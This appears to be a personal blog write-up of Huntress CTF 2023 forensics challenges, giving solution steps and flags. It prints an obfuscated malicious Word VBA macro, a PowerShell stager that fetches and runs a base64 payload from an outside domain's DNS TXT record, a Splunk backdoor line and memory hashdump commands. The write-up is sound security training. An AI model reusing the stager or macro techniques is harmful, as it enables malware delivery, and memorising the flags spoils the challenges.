---
layout: page
title: Huntress CTF 23 Forensics
subtitle: "Difficulty: Easy / Medium / Hard"
tags: [CTF, Learning, Forensics]
---

# Dumpter Fire - Easy

Unpack the provided file with `tar` which provides folders resembling a Linux root directory. Being an Easy challenge, I decided to do a search on user directories first which revealed a `home/challenge` user. Listing the contents reveals a .mozilla profile - which may contain passwords! I ran the tool `PasswordFox` on the profile to get the flag:

**`flag{35446041dc161cf5c9c325a3d28af3e3}`**

# Traffic - Medium

_We saw some communication to a sketchy site... here's an export of the network traffic. Can you track it down? Some tools like rita or zeek might help dig through all of this data!_

Extract the directory provided which contains a load of Gunzipped logs. Extract with `find . -name "*.gz" -exec gunzip -d {} \;`. Decided to `grep` for word "sketchy" seeing as it's in the challenge description which gets a match for a GitHub site: **sketchysite.github.io**. Navigate to the page to find the flag:

**`flag{8626fe7dcd8d412a80d0b3f0e36afd4a}`**

# Backdoored Splunk - Medium

Try opening instance in my browser and get an error about a missing Authorization header. Unpack the provided files and `grep` for the word **Authorization** and one of the results returns: 

```bash
Splunk_TA_windows/bin/powershell/nt6-health.ps1:$OS = @($html = (Invoke-WebRequest http://chal.ctf.games:$PORT -Headers @{Authorization=("Basic YmFja2Rvb3I6dXNlX3RoaXNfdG9fYXV0aGVudGljYXRlX3dpdGhfdGhlX2RlcGxveWVkX2h0dHBfc2VydmVyCg==")} -UseBasicParsing).Content
```

Decoding this states **"backdoor:use_this_to_authenticate_with_the_deployed_http_server"**. Send a curl request providing the string to the argument `-H Authorization:` which returns the flag in base64 format. Decoded:

**`flag{60bb3bfaf703e0fa36730ab70e115bd7}`**

# Wimble - Easy

Unzip to get a file **fetch**. Run `file` which references Windows WIM - search what this actually is and establish using DISM for mounting.

```ps1
dism /Mount-Wim /WimFile:Path\To\Your.wim /index:1 /MountDir:C:\MountDirectory
```

 After mounting with dism I am left with a bunch of prefetch files. Use PECmd on the directory while searching for the word flag:

![wimble](/assets/img/huntress_ctf23/wimble.png)
 
**`flag{97f33c9783c21df85d79d613b0b258bd}`**

# Opposable Thumbs - Easy

_NOTE: this flag does NOT follow the standard MD5 hash format, but does have the usual flag{} prefix and suffix._

Download and run this [tool](https://thumbcacheviewer.github.io/). There are only a handful of entries with a data checksum. The one required for the flag is as shown below:

![thumbs](/assets/img/huntress_ctf23/thumbs.png)

**`flag{human_after_all}`**

# Tragedy Redux - Medium

_We found this file as part of an attack chain that seemed to manipulate file contents to stage a payload. Can you make any sense of it?_

Extract and run `file`, returns file as zip so add the extension and unpack. Now have what appears to be Word file contents and directories, with the main item of interest being **word/vbaProject.bin**. Run olevba on this file to extract the OLE stream:

```cpp
Function Pears(Beets)
    Pears = Chr(Beets - 17)
End Function

Function Strawberries(Grapes)
    Strawberries = Left(Grapes, 3)
End Function

Function Almonds(Jelly)
    Almonds = Right(Jelly, Len(Jelly) - 3)
End Function

Function Nuts(Milk)
    Do
    OatMilk = OatMilk + Pears(Strawberries(Milk))
    Milk = Almonds(Milk)
    Loop While Len(Milk) > 0
    Nuts = OatMilk
End Function

Function Bears(Cows)
    Bears = StrReverse(Cows)
End Function

Function Tragedy()
    
    Dim Apples As String
    Dim Water As String

    If ActiveDocument.Name <> Nuts("131134127127118131063117128116") Then
        Exit Function
    End If
    
    Apples = "129128136118131132121118125125049062118127116049091088107132106104116074090126107132106104117072095123095124106067094069094126094139094085086070095139116067096088106065107085098066096088099121094101091126095123086069106126095074090120078078"
    Water = Nuts(Apples)
```

Analysis of this code shows a flow of:

- string split into chunks of 3
- interpret each chunk as int
- subtract 17 then convert the result to a character

I reimplemented this functionality in with the following python code:

```python
def Nuts(Milk):
    
    OatMilk = []
    chunk_size = 3
    chunks = [Milk[i:i+chunk_size] for i in range(0, len(Milk), chunk_size)]

    for chunk in chunks:
        OatMilk.append(chr(int(chunk) - 17))

    return OatMilk

def Tragedy():
    
    Apples = "129128136118131132121118125125049062118127116049091088107132106104116074090126107132106104117072095123095124106067094069094126094139094085086070095139116067096088106065107085098066096088099121094101091126095123086069106126095074090120078078"
    Water = Nuts(Apples)
    print("".join(Water))

if __name__ == '__main__':
    Tragedy()
```

The result is a powershell command to run a base64 encoded string: `powershell -enc JGZsYWc9ImZsYWd7NjNkY2M4MmMzMDE5Nzc2OGY0ZDQ1OGRhMTJmNjE4YmN9Ig==` which is actually setting a flag variable with the flag:

**`flag{63dcc82c30197768f4d458da12f618bc}`**

# Rogue Inbox - Medium

 _Your new customer is afraid that Debra was compromised. We received logs exported from Purview... can you figure out what the threat actor did? It might take some clever log-fu!_

This challenge set to annoy me for a while, largely based on my tendancy to like my CSV's formatted and word wrapped! To start with I filtered the top row and restricted results to Debra. From here a scan of the _AuditData_ showed a trend with the entries for _New-InboxRule_ operations in that **flag@ctf.com** could be seen. The json string was a hard read, even with word wrap enabled. I disabled it and spotted the flag like in this screenshot:

![rogue](/assets/img/huntress_ctf23/rogue.png)

```python
import json
import pandas as pd

df = pd.read_csv('purview.csv')
debs = df.loc[df['UserID'].str.contains('Debra')]
inbox_rules = debs.loc[debs['Operation'] == 'New-InboxRule']
inbox_rules['AuditData'] = inbox_rules['AuditData'].apply(json.loads)
flattened = pd.json_normalize(inbox_rules['AuditData'], record_path='Parameters')
flag = flattened.loc[flattened['Name'] == 'Name']
print(''.join(flag['Value']))
```

With the above code I was able to extract the flag:

**`flag{24c4230fa7d50eef392b2c850f74b0f6}`**

# Texas Chainsaw Massacre: Tokyo Drift - Hard

_Ugh! One of our users was trying to install a Texas Chainsaw Massacre video game, and installed malware instead. Our EDR detected a rogue process reading and writing events to the Application event log. Luckily, it killed the process and everything seems fine, but we don't know what it was doing in the event log._

Open log with `Event Log Explorer` and find an entry under event ID 1337 while scrolling. Confirm the game name and a big hex blob. Copy this into CyberChef and convert from hex to get what appears to be a heavily obfuscated PowerShell script. I decided to use `pwsh` in my Remnux host to try and deobfuscate by utilising `Write-Host` and omitting any commands I can that would try to run the code. 

First pass:

![texas1](/assets/img/huntress_ctf23/texas1.png)

Second pass:

![texas2](/assets/img/huntress_ctf23/texas2.png)

Final pass:

![texas3](/assets/img/huntress_ctf23/texas3.png)

As can be seen, there is a base64 encoded string in there. Pop it into CyberChef along with `Raw Inflate` to decode:

```ps1
try {$TGM8A = Get-WmiObject MSAcpi_ThermalZoneTemperature -Namespace "root/wmi" -ErrorAction 'silentlycontinue' ; if ($error.Count -eq 0) { $5GMLW = (Resolve-DnsName eventlog.zip -Type txt | ForEach-Object { $_.Strings }); if ($5GMLW -match '^[-A-Za-z0-9+/]*={0,3}$') { [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($5GMLW)) | Invoke-Expression } } } catch { }
```

Check the TXT record for the domain `eventlog.zip` using this [site](https://centralops.net/co/) to find another base64 string containing the flag:

**`flag{409537347c2fae01ef9826c2506ac660}`**

# Bad Memory - Medium

_A user came to us and said they forgot their password. Can you recover it? The flag is the MD5 hash of the recovered password wrapped in the proper flag format._

After obtaining and unpacking, I tried running `volatility3` to extract hashes but couldn't find command list online (never thought to check the man pages here!). I did however know how to achieve retrieval of hashes in `volatility`. I figured out the profile by using windows.info with `vol3` to ascertain Win10x64 and using the newest one from the volatility profiles list. To retrieve the NTLM hashes, you need to establish the Virtual Offsets for the SYSTEM and SAM registry hives which can be achieved like so:

```bash
vol.py -f image.bin --profile=Win10x64_19041 hivelist 
vol.py -f image.bin --profile=Win10x64_19041 hashdump -y <system v_offset> -s <sam v_offset> hashes.txt
```

Annoyingly, I was unable to crack the any of the NTLM dicovered using standard wordlists like `rockyou.txt`. Asked for a sanity check and found that others had used `vol3`, so I figured out running `vol3 --help | grep windows` will provide all the Windows functions available! The one required was `windows.hashdump` which provides a totally different output as well! The user **congo** is the odd one out, so copy this hash `ab395607d3779239b83eed9906b4fb92` to [crackstation](https://crackstation.net/) which found the password straight away. md5sum the password: `goldfish#` to submit as the flag:

**`flag{2eb53da441962150ae7d3840444dfdde}`**